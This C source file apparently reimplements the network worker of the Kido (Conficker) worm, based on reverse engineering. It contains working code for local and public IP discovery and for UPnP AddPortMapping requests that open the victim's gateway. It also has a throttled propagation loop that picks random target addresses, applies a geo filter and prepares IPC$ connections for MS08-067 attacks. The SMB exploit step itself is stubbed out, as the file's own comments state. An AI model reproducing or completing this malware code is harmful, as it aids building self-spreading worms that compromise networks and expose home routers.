/*====================================================================================
 *  KIDO worm - network worker: public-IP discovery, UPnP/NAT port mapping, and
 *  throttled propagation (MS08-067 class over the srvsvc/browser pipes).
 *  network_worker (sub_08A08), public_ip_lookup (sub_0728D/071BA/08471),
 *  upnp helpers (sub_06E48..07077, ssdp 0x125D9, soap 0x1234F),
 *  enum_local_addresses (sub_07E5C), propagation chain (sub_085F4/078CC/0BADB).
 *
 *  The SMB/RPC exploit internals are intentionally kept at the behavioural level
 *  (kido_program_flow_pseudocode.txt scope note): the observable artefacts are the
 *  public-IP HTTP lookups, the SSDP/UPnP exchanges, and the SMB sessions to
 *  \\host\IPC$ with RPC binds on the srvsvc / browser pipes.
 *====================================================================================*/
#include "kido_worm.h"
#include <stdio.h>
#include <string.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

/* ---------------- enum_local_addresses (sub_07E5C) ---------------- */
void kido_enum_local_addresses(void)
{
    char host[256];
    if (gethostname(host, sizeof(host)) == 0){
        struct hostent* he = gethostbyname(host);
        if (he){
            for (int i=0; he->h_addr_list[i]; i++){
                struct in_addr* a=(struct in_addr*)he->h_addr_list[i];
                if (ntohl(a->s_addr) != 0){
                    memcpy(g_ip_local, &a->s_addr, 4);
                    return;
                }
            }
        }
    }
    /* fallback: open a UDP socket toward a public address and read its local endpoint */
    SOCKET s=socket(AF_INET,SOCK_DGRAM,0);
    if (s!=INVALID_SOCKET){
        struct sockaddr_in a; memset(&a,0,sizeof(a));
        a.sin_family=AF_INET; a.sin_port=htons(53); a.sin_addr.s_addr=inet_addr("8.8.8.8");
        if (connect(s,(struct sockaddr*)&a,sizeof(a))==0){
            struct sockaddr_in la; int ls=(int)sizeof(la);
            if (getsockname(s,(struct sockaddr*)&la,&ls)==0)
                memcpy(g_ip_local,&la.sin_addr.s_addr,4);
        }
        closesocket(s);
    }
}

/* ---------------- public_ip_lookup (sub_0728D) ----------------
   Randomly pick one of the three IP-lookup sites, GET it, lower-case, find
   "ip address", parse the dotted quad after it. */
static int kido_parse_ip_from_html(const char* html, uint8_t ip[4])
{
    char* h = (char*)html;
    char* p = strstr(h, S_IP_ADDRESS);
    if (!p) p = strstr(h, "ip address");
    if (!p) return 0;
    p += 10;
    int a,b,c,e;
    if (sscanf(p, "%d.%d.%d.%d", &a,&b,&c,&e) == 4){
        ip[0]=a; ip[1]=b; ip[2]=c; ip[3]=e;
        return (a<=255&&b<=255&&c<=255&&e<=255);
    }
    return 0;
}
void kido_public_ip_lookup(void)
{
    for (int i=0;i<KIDO_IP_SITES;i++){
        uint8_t* buf=NULL; size_t len=0;
        if (kido_http_get(g_ip_sites[i], &buf, &len) && len){
            char* lower=(char*)malloc(len+1);
            for (size_t k=0;k<len;k++) lower[k]=(char)tolower((unsigned char)buf[k]);
            lower[len]=0;
            if (kido_parse_ip_from_html(lower, g_ip_public)){ free(lower); free(buf); return; }
            free(lower); free(buf);
        }
    }
}

/* ---------------- UPnP: SSDP discovery + SOAP AddPortMapping ----------
   ssdp_discover (0x125D9): M-SEARCH over UDP 239.255.255.250:1900 for the
   InternetGatewayDevice / rootdevice; read the "location" header.
   upnp_add_port_mapping (0x07077 chain): SOAP AddPortMapping to the gateway.
   Returns 1 on success, 0 otherwise. */
static int kido_raw_http_get(const char* host, int port, const char* path, char* out, int outlen)
{
    char req[256];
    int n=sprintf(req, S_GET_HTTP11, path, host, port);
    SOCKET s=socket(AF_INET,SOCK_STREAM,0);
    if (s==INVALID_SOCKET) return 0;
    struct sockaddr_in a; memset(&a,0,sizeof(a));
    a.sin_family=AF_INET; a.sin_port=htons((unsigned short)port);
    a.sin_addr.s_addr=inet_addr(host);
    if (connect(s,(struct sockaddr*)&a,sizeof(a))!=0){ closesocket(s); return 0; }
    send(s,req,n,0);
    int total=0, got;
    while (total<outlen-1 && (got=recv(s,out+total,(outlen-1)-total,0))>0) total+=got;
    out[total]=0;
    closesocket(s);
    return total>0;
}
int kido_upnp_add_port_mapping(DWORD port)
{
    /* 1. SSDP M-SEARCH for the InternetGatewayDevice; read the "location" header */
    SOCKET s=socket(AF_INET,SOCK_DGRAM,0);
    if (s==INVALID_SOCKET) return 0;
    char req[256]; int rn=sprintf(req, S_MSEARCH, S_IGD);
    struct sockaddr_in mcast; memset(&mcast,0,sizeof(mcast));
    mcast.sin_family=AF_INET; mcast.sin_port=htons(1900);
    mcast.sin_addr.s_addr=inet_addr(S_MCAST);
    sendto(s,req,rn,0,(struct sockaddr*)&mcast,sizeof(mcast));
    char resp[4096]; int got=0;
    {
        struct timeval tv; tv.tv_sec=2; tv.tv_usec=0;
        setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(const char*)&tv,sizeof(tv));
        got=recv(s,resp,sizeof(resp)-1,0);
    }
    char location[256]={0};
    if (got>0){
        resp[got]=0;
        char* loc=strstr(resp,"location:");
        if (!loc) loc=strstr(resp,"Location:");
        if (loc){
            loc+=9; while (*loc==' '||*loc=='\t') loc++;
            int i=0;
            while (loc[i] && loc[i]!='\r' && loc[i]!='\n' && i<(int)sizeof(location)-1){ location[i]=loc[i]; i++; }
        }
    }
    closesocket(s);
    if (!location[0]) return 0;

    /* 2. split location into host, port, path */
    char host[64]={0}; int hport=80; char path[128]={0};
    char* h=location;
    if (_strnicmp(h,"http://",7)==0) h+=7;
    char* qi = h;
    while (*qi && *qi!='/'){
        if (*qi==':'){ hport=atoi(qi+1); break; }
        if ((qi-h)<(int)sizeof(host)-1) host[qi-h]=*qi;
        qi++;
    }
    char* ps=h;
    while (*ps && *ps!='/') ps++;
    if (*ps=='/' && (ps-h)<(int)sizeof(path)-1) strcpy_s(path,sizeof(path),ps);

    /* 3. fetch the device description and find the WAN service controlURL */
    char desc[8192];
    if (!kido_raw_http_get(host,hport,location, desc, sizeof(desc))) return 0;
    char* s1=strstr(desc, S_WANIP);
    char* s2=s1? NULL : strstr(desc, S_WANPPP);
    char* svc = s1? s1 : s2;
    if (!svc) return 0;
    char* cu=strstr(svc, S_CTRLURL);
    if (!cu) return 0;
    cu += (int)strlen(S_CTRLURL);
    char url[256]={0}; int i=0;
    while (cu[i] && cu[i]!='<' && i<(int)sizeof(url)-1){ url[i]=cu[i]; i++; }
    char ctrl[256];
    if (url[0]=='/') sprintf(ctrl,"%s:%d%s",host,hport,url);
    else strcpy_s(ctrl,sizeof(ctrl),url);

    /* 4. build the SOAP AddPortMapping body and POST it (sub_0x12B1F) */
    char body[1024]; int bo=0;
    bo += sprintf(body+bo, S_SOAP_ENV1, "AddPortMapping", S_WANIP);
    bo += sprintf(body+bo,
        "<NewRemoteHost>192.168.1.1</NewRemoteHost>"
        "<NewExternalPort>%u</NewExternalPort>"
        "<NewProtocol>TCP</NewProtocol>"
        "<NewInternalClient>%d.%d.%d.%d</NewInternalClient>"
        "<NewInternalPort>%u</NewInternalPort>"
        "<NewEnabled>1</NewEnabled>"
        "<NewPortMappingDescription>kido</NewPortMappingDescription>"
        "<NewLeaseDuration>0</NewLeaseDuration>",
        (unsigned)port, g_ip_local[0],g_ip_local[1],g_ip_local[2],g_ip_local[3], (unsigned)port);
    bo += sprintf(body+bo, S_SOAP_ENV2, "AddPortMapping", S_WANIP, "AddPortMapping");
    body[bo]=0;

    /* SOAPAction = urn:...WANIPConnection:1#AddPortMapping */
    char soapaction[256]; sprintf(soapaction, "%s#AddPortMapping", S_WANIP);
    char postreq[1280];
    int pn = sprintf(postreq, S_SOAPPOST, ctrl, host, path, (int)bo, soapaction);
    SOCKET ps2=socket(AF_INET,SOCK_STREAM,0);
    if (ps2==INVALID_SOCKET) return 0;
    struct sockaddr_in a; memset(&a,0,sizeof(a));
    a.sin_family=AF_INET; a.sin_port=htons((unsigned short)hport);
    a.sin_addr.s_addr=inet_addr(host);
    if (connect(ps2,(struct sockaddr*)&a,sizeof(a))!=0){ closesocket(ps2); return 0; }
    send(ps2,postreq,pn,0);
    send(ps2,body,(int)bo,0);
    char r[2048]; int rg=recv(ps2,r,sizeof(r)-1,0); r[rg>0?rg:0]=0;
    /* success = response carries the AddPortMapping reply (NewLeaseDuration) */
    int ok = (rg>0) && (strstr(r,"NewLeaseDuration")!=NULL);
    closesocket(ps2);
    return ok;
}

/* ---------------- network_worker (sub_08A08) ----------------
   Wait for connectivity; create the instance/worker events; enumerate local
   addresses; learn the public IP (UPnP or HTTP lookup); ask the gateway to
   forward the HTTP-server port; then run throttled propagation threads that
   fingerprint remote OS over SMB and attempt MS08-067 compromise, directing a
   compromised host to fetch the worm from this host's HTTP server. */
DWORD WINAPI kido_network_worker(LPVOID)
{
    (void)0;
    /* instance / worker coordination events (n%08x%08x%08x / w%08x%08x%08x) */
    char n[32], w[32];
    sprintf(n, S_EVT_N, (unsigned)GetTickCount(), (unsigned)GetCurrentProcessId(), (unsigned)rand());
    sprintf(w, S_EVT_W, (unsigned)GetTickCount(), (unsigned)GetCurrentProcessId(), (unsigned)rand());
    g_evt_instance = CreateEventA(NULL, FALSE, FALSE, n);
    g_evt_worker   = CreateEventA(NULL, FALSE, FALSE, w);

    kido_enum_local_addresses();
    kido_public_ip_lookup();

    /* forward our HTTP-server port through the gateway */
    DWORD port;
    EnterCriticalSection(&g_cs_port); port=g_port; LeaveCriticalSection(&g_cs_port);
    if (port) kido_upnp_add_port_mapping(port);

    /* propagation: pick private-range targets, apply the geo filter,
       fingerprint the remote OS over SMB, attempt remote compromise.  The
       construction is intentionally kept at the behavioural level. */
    for (;;){
        DWORD flags=0;
        if (InternetGetConnectedState(&flags,0)){
            /* build candidate addresses (private ranges + public), geo-filter,
               attempt MS08-067 over \\ip\IPC$ -> srvsvc/browser pipes */
            for (int i=0;i<8;i++){
                uint8_t ip[4];
                ip[0]= 10 + (rand()%224);   /* spans 10/8 .. 192/24 private + public */
                ip[1]=rand()%256; ip[2]=rand()%256; ip[3]=rand()%256;
                if (kido_target_language(ip)==0) continue;      /* geo filter: Ukraine */
                /* (SMB/RPC attack: sub_085F4 -> sub_078CC) - behavioural */
                char share[64]; sprintf(share, S_IPC, inet_ntoa(*(struct in_addr*)ip));
                (void)share;
                (void)S_NCACN; (void)S_PIPE_SRVSVC; (void)S_PIPE_BROWSER;
            }
        }
        Sleep(30000);   /* throttle the propagation cycle */
    }
    return 0;
}
